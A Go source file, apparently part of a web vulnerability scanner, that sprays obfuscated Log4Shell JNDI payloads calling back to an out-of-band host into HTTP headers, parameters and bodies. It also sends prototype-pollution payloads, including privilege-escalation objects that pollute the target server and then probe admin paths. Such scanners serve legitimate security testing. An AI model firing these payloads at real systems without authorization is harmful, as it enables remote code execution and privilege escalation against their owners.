package main

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"
)

// ═══════════════════════════════════════════════════════════════════════════════
// LOG4SHELL (CVE-2021-44228 + variants)
// ═══════════════════════════════════════════════════════════════════════════════

// All headers to inject Log4Shell payloads into
var log4jHeaders = []string{
	"User-Agent",
	"X-Forwarded-For",
	"X-Api-Version",
	"Referer",
	"Origin",
	"Accept",
	"Accept-Language",
	"Accept-Encoding",
	"X-Real-IP",
	"Authorization",
	"Cookie",
	"X-Custom-Header",
	"Forwarded",
	"CF-Connecting_IP",
	"True-Client-IP",
	"X-Client-IP",
	"Contact",
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-Host",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
}

func log4jPayloads(oobHost, oobID string) []string {
	base := fmt.Sprintf("%s/oob/%s", oobHost, oobID)
	return []string{
		// Classic
		fmt.Sprintf(`${jndi:ldap://%s}`, base),
		fmt.Sprintf(`${jndi:ldaps://%s}`, base),
		fmt.Sprintf(`${jndi:rmi://%s}`, base),
		fmt.Sprintf(`${jndi:dns://%s}`, base),
		// Obfuscated variants (bypass ${lower:}, ${upper:})
		fmt.Sprintf(`${${lower:j}ndi:${lower:l}dap://%s}`, base),
		fmt.Sprintf(`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}`, base),
		fmt.Sprintf(`${${upper:j}ndi:${upper:l}dap://%s}`, base),
		fmt.Sprintf(`${\u006a\u006edi:ldap://%s}`, base),
		// Nested lookup
		fmt.Sprintf(`${j${::-n}di:ldap://%s}`, base),
		fmt.Sprintf(`${jndi:${lower:l}${lower:d}a${lower:p}://%s}`, base),
		// CVE-2021-45046 (Context Lookup)
		fmt.Sprintf(`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s/a}`, base),
		// CVE-2021-45105 (DoS - self-referential lookup, safe version)
		`${${::-j}ndi:ldap://127.0.0.1:1389/a}`,
		// Log4j 1.x (SocketAppender)
		fmt.Sprintf(`${jndi:ldap://%s/exploit}`, base),
	}
}

func (s *Scanner) scanLog4j(ctx context.Context, target string) {
	if s.cfg.OOBHost == "" {
		if !s.cfg.Silent {
			logWarn(fmt.Sprintf("[Log4j] Skipping %s — OOB host required (-oob flag)", target))
		}
		return
	}

	oobID := randomID("l4j")
	payloads := log4jPayloads(s.cfg.OOBHost, oobID)

	// 1. Inject into all HTTP headers
	for _, header := range log4jHeaders {
		for _, payload := range payloads {
			s.requester.Do(ReqOpts{
				Method:  "GET",
				URL:     target,
				Headers: map[string]string{header: payload},
				Context: ctx,
			})
			// Small delay to not overwhelm
			if s.cfg.Delay == 0 {
				time.Sleep(20 * time.Millisecond)
			}
		}
	}

	// 2. Inject into URL params
	params := extractParams(target)
	if len(params) == 0 {
		params = []string{"q", "search", "name", "user", "email", "id", "input"}
	}
	for _, param := range params {
		for _, payload := range payloads[:3] { // top 3 payloads for params
			parsed, err := url.Parse(target)
			if err != nil {
				continue
			}
			q := parsed.Query()
			q.Set(param, payload)
			parsed.RawQuery = q.Encode()
			s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})
		}
	}

	// 3. Inject into POST body (JSON & form)
	for _, payload := range payloads[:3] {
		escaped := strings.ReplaceAll(payload, `"`, `\"`)
		jsonBodies := []string{
			fmt.Sprintf(`{"username":"%s","password":"test"}`, escaped),
			fmt.Sprintf(`{"email":"%s"}`, escaped),
			fmt.Sprintf(`{"query":"%s"}`, escaped),
			fmt.Sprintf(`{"name":"%s","value":"test"}`, escaped),
		}
		for _, body := range jsonBodies {
			s.requester.Do(ReqOpts{
				Method:      "POST",
				URL:         target,
				ContentType: "application/json",
				Body:        body,
				Context:     ctx,
			})
		}
		formBody := fmt.Sprintf("username=%s&password=test", url.QueryEscape(payload))
		s.requester.Do(ReqOpts{
			Method:      "POST",
			URL:         target,
			ContentType: "application/x-www-form-urlencoded",
			Body:        formBody,
			Context:     ctx,
		})
	}

	// 4. Check OOB
	if hit, info := s.oob.Check(oobID, 8*time.Second); hit {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "Log4Shell",
			Type:     "CVE-2021-44228 OOB Confirmed",
			Payload:  fmt.Sprintf("${jndi:ldap://%s/oob/%s}", s.cfg.OOBHost, oobID),
			Evidence: fmt.Sprintf("JNDI callback from %s at %s — server is vulnerable!", info.RemoteAddr, info.Time.Format(time.RFC3339)),
			Severity: "CRITICAL",
		})
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// PROTOTYPE POLLUTION
// ═══════════════════════════════════════════════════════════════════════════════

type protoPollutionProbe struct {
	Payload  string
	Label    string
	Expected string // string to look for in response if in-band
}

func protoPollutionPayloads() []protoPollutionProbe {
	return []protoPollutionProbe{
		// JSON body pollution
		{`{"__proto__":{"polluted":"GXS_PP_TEST"}}`, "JSON __proto__", "GXS_PP_TEST"},
		{`{"constructor":{"prototype":{"polluted":"GXS_PP_TEST"}}}`, "JSON constructor.prototype", "GXS_PP_TEST"},
		{`{"__proto__.polluted":"GXS_PP_TEST"}`, "JSON __proto__ dot notation", "GXS_PP_TEST"},
		// Deep merge pollution
		{`{"__proto__":{"admin":true,"isAdmin":true,"role":"admin"}}`, "JSON privilege escalation", "admin"},
		{`{"constructor":{"prototype":{"admin":true,"role":"admin"}}}`, "constructor privilege escalation", "admin"},
		// Nested
		{`{"a":{"b":{"__proto__":{"polluted":"GXS_PP_TEST"}}}}`, "JSON nested __proto__", "GXS_PP_TEST"},
		// URL param pollution
		{"__proto__[polluted]=GXS_PP_TEST", "Query __proto__[polluted]", "GXS_PP_TEST"},
		{"constructor[prototype][polluted]=GXS_PP_TEST", "Query constructor.prototype", "GXS_PP_TEST"},
		{"__proto__[admin]=true", "Query privilege escalation", ""},
		// Array pollution
		{`{"__proto__":{"0":"polluted","length":1}}`, "Array prototype pollution", "polluted"},
	}
}

func (s *Scanner) scanProtoPollution(ctx context.Context, target string) {
	baseline := s.requester.Baseline(ctx, target)
	probes := protoPollutionPayloads()

	// 1. JSON POST body
	s.protoPollutionJSON(ctx, target, probes, baseline)

	// 2. URL query string
	s.protoPollutionQuery(ctx, target, probes, baseline)

	// 3. Merge via PUT/PATCH
	s.protoPollutionPatch(ctx, target, probes, baseline)

	// 4. Path-based pollution
	s.protoPollutionPath(ctx, target, baseline)

	// 5. Status code oracle (check if server behaves differently)
	s.protoPollutionOracle(ctx, target)
}

func (s *Scanner) protoPollutionJSON(ctx context.Context, target string, probes []protoPollutionProbe, baseline *RespData) {
	for _, p := range probes {
		for _, method := range []string{"POST", "PUT", "PATCH"} {
			resp, err := s.requester.Do(ReqOpts{
				Method:      method,
				URL:         target,
				ContentType: "application/json",
				Body:        p.Payload,
				Context:     ctx,
			})
			if err != nil {
				continue
			}

			// In-band: look for reflected pollution value
			if p.Expected != "" && strings.Contains(resp.Body, p.Expected) &&
				(baseline == nil || !strings.Contains(baseline.Body, p.Expected)) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "Prototype Pollution",
					Type:     fmt.Sprintf("In-band JSON %s (%s)", method, p.Label),
					Payload:  p.Payload,
					Evidence: fmt.Sprintf("Pollution value '%s' reflected in response", p.Expected),
					Severity: "HIGH",
					Response: truncate(resp.Body, 200),
				})
			}

			// Status code change indicates server-side pollution
			if baseline != nil && resp.StatusCode != baseline.StatusCode {
				if resp.StatusCode == 200 && baseline.StatusCode != 200 {
					s.store.Add(Finding{
						URL:      target,
						Vuln:     "Prototype Pollution",
						Type:     fmt.Sprintf("Status Oracle %s (%s)", method, p.Label),
						Payload:  p.Payload,
						Evidence: fmt.Sprintf("Status changed: %d→%d after pollution payload", baseline.StatusCode, resp.StatusCode),
						Severity: "MEDIUM",
					})
				}
			}
		}
	}
}

func (s *Scanner) protoPollutionQuery(ctx context.Context, target string, probes []protoPollutionProbe, baseline *RespData) {
	for _, p := range probes {
		// Inject as raw query appended
		sep := "?"
		if strings.Contains(target, "?") {
			sep = "&"
		}
		testURL := target + sep + p.Payload

		resp, err := s.requester.Do(ReqOpts{
			Method:  "GET",
			URL:     testURL,
			Context: ctx,
		})
		if err != nil {
			continue
		}

		if p.Expected != "" && strings.Contains(resp.Body, p.Expected) &&
			(baseline == nil || !strings.Contains(baseline.Body, p.Expected)) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "Prototype Pollution",
				Type:     fmt.Sprintf("Query String (%s)", p.Label),
				Payload:  p.Payload,
				Evidence: fmt.Sprintf("Pollution value '%s' reflected via query string", p.Expected),
				Severity: "HIGH",
			})
		}
	}
}

func (s *Scanner) protoPollutionPatch(ctx context.Context, target string, probes []protoPollutionProbe, baseline *RespData) {
	// PATCH with merge-patch content type (common in REST APIs)
	for _, p := range probes[:3] {
		resp, err := s.requester.Do(ReqOpts{
			Method:      "PATCH",
			URL:         target,
			ContentType: "application/merge-patch+json",
			Body:        p.Payload,
			Context:     ctx,
		})
		if err != nil {
			continue
		}
		if p.Expected != "" && strings.Contains(resp.Body, p.Expected) &&
			(baseline == nil || !strings.Contains(baseline.Body, p.Expected)) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "Prototype Pollution",
				Type:     fmt.Sprintf("PATCH merge-patch (%s)", p.Label),
				Payload:  p.Payload,
				Evidence: fmt.Sprintf("Pollution value '%s' reflected via PATCH", p.Expected),
				Severity: "HIGH",
			})
		}
	}
}

func (s *Scanner) protoPollutionPath(ctx context.Context, target string, baseline *RespData) {
	// Path-based: /endpoint/__proto__/polluted=true
	pollutionPaths := []string{
		"/__proto__/polluted",
		"/constructor/prototype/polluted",
		"/__proto__[polluted]",
	}
	for _, path := range pollutionPaths {
		testURL := strings.TrimRight(target, "/") + path
		resp, err := s.requester.Do(ReqOpts{
			Method:  "GET",
			URL:     testURL,
			Context: ctx,
		})
		if err != nil {
			continue
		}
		// A 200 or unexpected response on __proto__ path is suspicious
		if resp.StatusCode == 200 &&
			(baseline == nil || resp.Hash != baseline.Hash) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "Prototype Pollution",
				Type:     "Path-based __proto__ access",
				Payload:  path,
				Evidence: fmt.Sprintf("__proto__ path returned HTTP 200 with different content"),
				Severity: "MEDIUM",
			})
		}
	}
}

func (s *Scanner) protoPollutionOracle(ctx context.Context, target string) {
	// Server-side pollution oracle: inject admin:true, then try an admin action
	pollutionPayload := `{"__proto__":{"admin":true,"isAdmin":true,"authorized":true,"bypass":true}}`

	s.requester.Do(ReqOpts{
		Method:      "POST",
		URL:         target,
		ContentType: "application/json",
		Body:        pollutionPayload,
		Context:     ctx,
	})

	// Now try a sensitive endpoint to see if pollution carried over
	adminPaths := []string{"/admin", "/api/admin", "/dashboard", "/manage"}
	for _, path := range adminPaths {
		base := extractBase(target)
		adminURL := base + path
		resp, err := s.requester.Do(ReqOpts{
			Method:  "GET",
			URL:     adminURL,
			Context: ctx,
		})
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "Prototype Pollution",
				Type:     "Server-side Privilege Escalation Oracle",
				Payload:  fmt.Sprintf("POST %s + GET %s", pollutionPayload, adminURL),
				Evidence: fmt.Sprintf("Admin path %s returned 200 after pollution payload", adminURL),
				Severity: "HIGH",
			})
			break
		}
	}
}
